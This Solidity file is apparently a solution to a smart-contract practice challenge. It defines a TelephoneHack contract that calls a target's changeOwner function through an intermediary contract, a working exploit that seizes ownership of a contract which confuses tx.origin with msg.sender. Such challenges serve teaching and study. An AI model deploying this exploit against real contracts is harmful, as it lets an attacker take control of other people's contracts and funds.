// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    address telephoneAddress;

    constructor(address _telephoneAddress) {
        telephoneAddress = _telephoneAddress;
    }

    function hackTelephone(address newOwner) public {
        Telephone telephoneContract = Telephone(telephoneAddress);
        telephoneContract.changeOwner(newOwner);
    }
}